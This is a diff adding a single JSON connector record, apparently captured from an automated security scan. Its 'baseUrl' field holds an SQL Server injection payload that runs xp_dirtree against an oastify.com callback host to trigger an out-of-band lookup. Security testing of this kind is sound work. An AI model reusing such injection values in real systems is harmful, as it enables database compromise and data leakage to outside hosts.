@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/zgjZCdeP');declare @q varchar(99);set @q='\\\\v842b9d295ov1dywkudwvhhdj4pxdo4cv5jx6pue.oasti'+'fy.com\\hmg'; exec master.dbo.xp_dirtree @q;-- ",
+	"createdTime":1741334824578,
+	"deleted":false,
+	"description":"qvaqcL",
+	"enabled":false,
+	"id":"67caa928b8a3852f709fe4c5",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741334824578,
+	"name":"hsuDcq",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
